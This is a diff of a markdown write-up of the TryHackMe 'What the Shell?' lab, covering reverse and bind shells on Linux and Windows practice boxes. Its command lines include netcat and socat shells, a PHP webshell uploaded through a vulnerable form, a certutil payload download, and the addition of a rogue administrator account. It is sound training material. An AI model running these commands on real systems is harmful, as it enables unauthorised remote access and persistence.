@@ -1,3 +1,5 @@
+# TryHackMe: What The Shell Room Summary
+
 Room Link: 
 
 [What the Shell?](https://tryhackme.com/room/introtoshells)
@@ -610,7 +612,7 @@ nc 10.10.61.237 8080 -e /bin/bash
 nc -lvnp 8080
 ```
 
-![image.png](attachment:8bd4b4f7-407a-4b26-b1bf-fe1de8c2925c:image.png)
+<img width="1759" height="695" alt="image" src="https://github.com/user-attachments/assets/cf4549ed-2b3f-4c5b-95e4-84ffff155f56" />
 
 [Python reverse shell (Linux only)](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python)
 
@@ -628,7 +630,7 @@ nc -lvnp 4444 -e /bin/bash
 nc 10.10.246.202 4444
 ```
 
-![image.png](attachment:7691b1d1-55df-4020-ab3a-3f0f1306ea9f:image.png)
+<img width="1795" height="822" alt="image" src="https://github.com/user-attachments/assets/c8cb9f66-a048-4f89-bbcc-04fba550bc0f" />
 
 [Python Bind Shell (Linux)](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#python)
 
@@ -663,7 +665,7 @@ nc -lvnp 8080
 shell@ip-10-10-246-202:~$
 ```
 
-![image.png](attachment:f7a25929-6736-4fc1-a436-be107d19e02d:image.png)
+<img width="1758" height="799" alt="image" src="https://github.com/user-attachments/assets/e42e2ee0-b14f-431f-b313-e3fcd2e67f32" />
 
 use **`reset`** or **`stty sane`** to restore default settings
 
@@ -679,7 +681,7 @@ rlwrap nc -lvnp 8080
 stty raw -echo;fg
 ```
 
-![image.png](attachment:dfcaaefa-e26d-437d-8a74-193fe91cb428:image.png)
+<img width="1784" height="550" alt="image" src="https://github.com/user-attachments/assets/44f874f7-d9ed-4b34-b0e7-55fcfc5e50b2" />
 
 ---
 
@@ -693,7 +695,7 @@ socat TCP-L:8080 -
 socat TCP:10.10.142.87:8080 EXEC:"bash -li"
 ```
 
-![image.png](attachment:87609271-ff78-4b23-a8e3-4df2f5e10231:image.png)
+<img width="1678" height="631" alt="image" src="https://github.com/user-attachments/assets/e1051fbe-000d-4f6b-8159-77abf518da24" />
 
 Socat with the tty technique
 
@@ -705,7 +707,7 @@ socat TCP-L:443 FILE:`tty`,raw,echo=0
 socat TCP:10.10.142.87:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 
-![image.png](attachment:52625774-6d27-4152-b3a8-38f8deeaf5a3:image.png)
+<img width="1759" height="872" alt="image" src="https://github.com/user-attachments/assets/44c930f7-0502-4ecd-89b6-fb3866ba67fc" />
 
 **Note**: In the Attacker-1 (left terminal), started the reverse shell, and the Attacker-2 caught the connection, as for the Target terminal (Upper right), echoes the Attacker-1 commands
 
@@ -726,7 +728,7 @@ socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 -
 socat OPENSSL:10.10.21.122:4444,verify=0 EXEC:/bin/bash
 ```
 
-![image.png](attachment:4a9dcbe2-98c2-45b8-92e9-8c494818a0cc:image.png)
+<img width="1760" height="692" alt="image" src="https://github.com/user-attachments/assets/40bdb1fd-1e4c-4b5d-bf9e-02549bc999e2" />
 
 **Bind-Shell (Linux)**
 
@@ -738,17 +740,17 @@ socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 EXEC:/bin/bash
 socat OPENSSL:10.10.100.173:4444,verify=0 -
 ```
 
-![image.png](attachment:686d51f6-bd94-4c41-8a1b-c78c7f1362c2:image.png)
+<img width="1791" height="651" alt="image" src="https://github.com/user-attachments/assets/5bc39478-99ae-4af2-b75b-d1d763882619" />
 
 ### Webshell
 
 Use built-in webshells in linux: `/usr/share/webshells/php/php-reverse-shell.php` Then, change the connection back IP and the listening port. 
 
-![image.png](attachment:6b3d5ec4-8c74-4a03-818f-f59faf4f6241:image.png)
+<img width="840" height="722" alt="image" src="https://github.com/user-attachments/assets/87e4dfe0-517b-4d93-82ca-54dd5f3c2eb8" />
 
 View the page vulnerable to file uploading, and upload your reverse shell PHP file.
 
-![image.png](attachment:c24e766a-79b7-4ef7-bc83-94d37db47e75:image.png)
+<img width="1297" height="717" alt="image" src="https://github.com/user-attachments/assets/9436edaa-a46d-4ff6-ac4b-8077ed562f32" />
 
 Access the uploaded file via:
 
@@ -764,7 +766,7 @@ nc -lvnp 4444
 
 Once gained a shell, I stabilized with Python
 
-![image.png](attachment:9172bff7-66f9-4ea5-a17c-dfc33f44f037:image.png)
+<img width="1833" height="737" alt="image" src="https://github.com/user-attachments/assets/054237b1-f569-4185-ae39-7c325ce84037" />
 
 ## Windows Practice box
 
@@ -778,7 +780,7 @@ nc -lvnp 4444
 nc 10.10.148.61 4444 -e "cmd.exe"
 ```
 
-![image.png](attachment:d23ecc29-442f-409a-a102-d851efe8b8ee:image.png)
+<img width="1827" height="768" alt="image" src="https://github.com/user-attachments/assets/ad8c4b45-5b2d-4d06-955a-8592d42654d2" />
 
 ### Netcat Shell Stabilization
 
@@ -792,7 +794,7 @@ rlwrap nc -lvnp 4444
 nc 10.10.228.112 4444 -e "cmd.exe"
 ```
 
-![image.png](attachment:216d477f-bd63-4eaa-ae2a-0ed476faa5bd:image.png)
+<img width="1843" height="731" alt="image" src="https://github.com/user-attachments/assets/7523f5a9-2811-48cc-8bcc-7ac3c0974db9" />
 
 1. Socat
 
@@ -818,23 +820,23 @@ Open an HTTP server on your machine, then download it from the victim machine us
 certutil -urlcache -split -f http://10.10.148.61:8888/shell_encoded.exe Downloads/shell_encoded.exe
 ```
 
-![Screenshot 2025-08-10 133826.png](attachment:2305b775-fcad-4a90-ae25-972d6eaea5b8:Screenshot_2025-08-10_133826.png)
+<img width="1897" height="759" alt="image" src="https://github.com/user-attachments/assets/bac2136c-255c-43be-a0f8-86ced6a6175f" />
 
 Launch msfconsole, use `exploit/multi/handler`. Set the required options, then start the handler 
 
-![image.png](attachment:6bbc7114-3afa-43ea-b55e-ee7b8ee79f7b:image.png)
+<img width="1893" height="812" alt="image" src="https://github.com/user-attachments/assets/9363daee-d908-4ec1-9b25-49b1b64bc9e4" />
 
 ### Webshell
 
 First, I tried to upload the php-reverse-shell.php file I used for Linux web server, but it returned this error: 
 
-![image.png](attachment:456d196b-d61b-432f-bcf6-a42fc7905bfc:image.png)
+<img width="1894" height="661" alt="image" src="https://github.com/user-attachments/assets/50d9f725-e88b-47d4-b8cd-f7c3b6a9bc79" />
 
 The script assumes a **Linux environment** (hence **`daemon`** errors). Windows lacks POSIX functions (**`pcntl_fork()`**), and the shell briefly worked but was likely killed by security tools. To fix this, u**se a Windows-compatible PHP Reverse Shell.** 
 
 https://github.com/Dhayalanb/windows-php-reverse-shell.git
 
-![image.png](attachment:34822836-66b8-49fc-855e-327fff340b20:image.png)
+<img width="1737" height="787" alt="image" src="https://github.com/user-attachments/assets/eca82661-9ade-42f1-aeac-37decb90385d" />
 
 Achieve persistence via adding a new account for RDP/WinRM access:
 
@@ -846,7 +848,7 @@ net user Aisha Pass1234! /add
 net localgroup Administrators Aisha /add
 ```
 
-![image.png](attachment:45f255d8-835d-44a8-a8a4-38a995866b19:image.png)
+<img width="841" height="300" alt="image" src="https://github.com/user-attachments/assets/5658c669-3516-4e8b-84d5-0a0f573a4a5b" />
 
 Then login over RDP. 
 
